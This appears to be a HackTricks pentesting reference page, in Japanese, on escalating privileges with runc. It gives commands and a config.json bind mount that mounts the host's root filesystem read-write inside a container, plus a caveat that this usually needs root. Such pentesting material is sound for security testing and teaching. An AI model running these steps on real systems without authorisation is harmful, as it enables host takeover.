# RunC特権昇格

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**runc**についてもっと知りたい場合は、以下のページを確認してください：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

ホストに`runc`がインストールされている場合、**ホストのルート/フォルダーをマウントしたコンテナを実行できる可能性があります**。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> これは常に機能するわけではありません。runcのデフォルトの動作はrootとして実行することなので、特権のないユーザーとして実行することは単純に機能しません（ルートレス構成がない限り）。ルートレス構成をデフォルトにすることは一般的には良いアイデアではありません。なぜなら、ルートレスコンテナ内には、ルートレスコンテナの外には適用されないいくつかの制限があるからです。

{{#include ../../banners/hacktricks-training.md}}
